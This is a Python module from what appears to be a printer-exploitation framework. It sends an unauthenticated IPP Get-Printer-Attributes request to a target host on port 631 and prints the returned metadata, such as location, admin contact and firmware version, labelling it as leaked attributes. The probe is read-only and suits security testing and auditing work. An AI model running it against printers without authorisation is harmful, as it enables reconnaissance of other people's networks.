#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
IPP Get-Printer-Attributes Information Leakage
PrinterXPL-Forge
================================================
IPP Get-Printer-Attributes (RFC 2911) returns extensive printer
metadata including location, admin contact, supported formats,
network paths and firmware version - all without authentication.

Author: Andre Henrique (@mrhenrike) | Uniao Geek
"""
from __future__ import annotations

import socket
import struct
from typing import Any, Dict, List, Optional

METADATA = {
    "id":          "IPP-INFO-001",
    "source":      "research",
    "url":         "https://www.rfc-editor.org/rfc/rfc2911#section-3.2.5",
    "cve":         "",
    "title":       "IPP Get-Printer-Attributes Unauthenticated Information Disclosure",
    "description": (
        "IPP operation 0x000B (Get-Printer-Attributes) exposes sensitive "
        "printer metadata without authentication: device name, location, "
        "admin contact, supported document formats, URI paths, firmware "
        "version, and operational state."
    ),
    "type":        "remote",
    "category":    "info_disclosure",
    "protocol":    "IPP",
    "port":        631,
    "severity":    "medium",
    "cvss":        5.3,
    "date":        "2024-01-01",
    "author":      "Andre Henrique (@mrhenrike) | Uniao Geek",
    "vendor":      [],
    "model_patterns": [],
    "firmware_patterns": [],
    "requires":    ["port:631"],
    "tags":        ["ipp", "information-disclosure", "unauthenticated", "printer"],
    "tested_on":   [],
    "references":  [
        "https://www.rfc-editor.org/rfc/rfc2911",
        "https://istage.sourceforge.net/IPP/",
    ],
}


def _build_ipp_get_printer_attrs(request_id: int = 1) -> bytes:
    """Build a minimal IPP Get-Printer-Attributes request over HTTP/1.0."""
    # IPP PDU: version(2) + operation(2) + request-id(4) + attributes
    ipp_version = b"\x01\x01"  # IPP/1.1
    operation = struct.pack(">H", 0x000B)  # Get-Printer-Attributes
    req_id = struct.pack(">I", request_id)

    # Attribute groups
    # Operation attributes group tag = 0x01
    # attribute-charset (value-tag=0x47, name="attributes-charset", value="utf-8")
    def _encode_attr(value_tag: int, name: str, value: str) -> bytes:
        n = name.encode("ascii")
        v = value.encode("utf-8")
        return bytes([value_tag]) + struct.pack(">H", len(n)) + n + struct.pack(">H", len(v)) + v

    def _encode_uri_attr(name: str, value: str) -> bytes:
        return _encode_attr(0x45, name, value)

    ipp_body = (
        ipp_version
        + operation
        + req_id
        + b"\x01"  # operation attributes group
        + _encode_attr(0x47, "attributes-charset", "utf-8")
        + _encode_attr(0x48, "attributes-natural-language", "en")
        + _encode_uri_attr("printer-uri", "ipp://localhost/ipp/print")
        + b"\x03"  # end-of-attributes tag
    )

    # Wrap in HTTP/1.0 request
    http_headers = (
        f"POST /ipp/print HTTP/1.0\r\n"
        f"Content-Type: application/ipp\r\n"
        f"Content-Length: {len(ipp_body)}\r\n"
        f"\r\n"
    ).encode("ascii")

    return http_headers + ipp_body


def _parse_ipp_response(data: bytes) -> Dict[str, Any]:
    """Extract key attributes from IPP Get-Printer-Attributes response."""
    result: Dict[str, Any] = {"raw_length": len(data)}
    if not data:
        return result

    # Skip HTTP headers
    header_end = data.find(b"\r\n\r\n")
    if header_end == -1:
        return result
    ipp_payload = data[header_end + 4:]

    if len(ipp_payload) < 8:
        return result

    # Quick string extraction: scan for printable ASCII strings
    strings_found: List[str] = []
    i = 8  # skip IPP header (version 2B + op 2B + request-id 4B)
    while i < len(ipp_payload) - 2:
        # Look for length-prefixed strings (IPP attribute encoding)
        try:
            name_len = struct.unpack(">H", ipp_payload[i:i + 2])[0]
            i += 2
            if 0 < name_len < 128 and i + name_len <= len(ipp_payload):
                name = ipp_payload[i:i + name_len].decode("ascii", errors="ignore")
                i += name_len
                if name and name.isprintable() and len(name) > 2:
                    strings_found.append(name)
                if i + 2 <= len(ipp_payload):
                    val_len = struct.unpack(">H", ipp_payload[i:i + 2])[0]
                    i += 2
                    if 0 < val_len < 256 and i + val_len <= len(ipp_payload):
                        val = ipp_payload[i:i + val_len].decode("utf-8", errors="ignore")
                        i += val_len
                        if val and len(val) > 0:
                            strings_found.append(f"{name}={val}" if name else val)
                    else:
                        i += val_len if val_len < 512 else 0
            else:
                i += 1
        except Exception:
            i += 1

    result["attributes"] = strings_found[:40]
    return result


def check(host: str, port: int = 631, timeout: float = 8.0) -> bool:
    """Return True if IPP port is open and responds to Get-Printer-Attributes."""
    try:
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        sock.settimeout(timeout)
        sock.connect((host, port))
        req = _build_ipp_get_printer_attrs()
        sock.sendall(req)
        resp = sock.recv(4096)
        sock.close()
        # Check for valid IPP response (HTTP 200 + IPP version byte 0x01 or 0x02)
        return b"200 OK" in resp or b"application/ipp" in resp
    except Exception:
        return False


def run(host: str, port: int = 631, timeout: float = 8.0,
        dry_run: bool = True, **opts) -> Dict[str, Any]:
    """Execute Get-Printer-Attributes and return extracted information.

    Args:
        dry_run: unused for this read-only probe, accepted for interface parity.

    Returns:
        Dict with 'success', 'host', 'port', 'attributes', 'raw_length'.
    """
    result: Dict[str, Any] = {
        "success": False,
        "host": host,
        "port": port,
        "attributes": [],
        "raw_length": 0,
        "error": None,
    }
    try:
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        sock.settimeout(timeout)
        sock.connect((host, port))
        req = _build_ipp_get_printer_attrs()
        sock.sendall(req)
        resp = b""
        while True:
            chunk = sock.recv(8192)
            if not chunk:
                break
            resp += chunk
            if len(resp) > 65536:
                break
        sock.close()

        parsed = _parse_ipp_response(resp)
        result["success"] = len(resp) > 50
        result["attributes"] = parsed.get("attributes", [])
        result["raw_length"] = parsed.get("raw_length", 0)

        if result["success"]:
            print(f"\n[+] IPP Get-Printer-Attributes: {host}:{port}")
            print(f"    Response size: {result['raw_length']} bytes")
            if result["attributes"]:
                print(f"    Leaked attributes ({len(result['attributes'])}):")
                for attr in result["attributes"][:20]:
                    print(f"      {attr}")

    except Exception as exc:
        result["error"] = str(exc)
        print(f"[-] IPP error: {exc}")

    return result
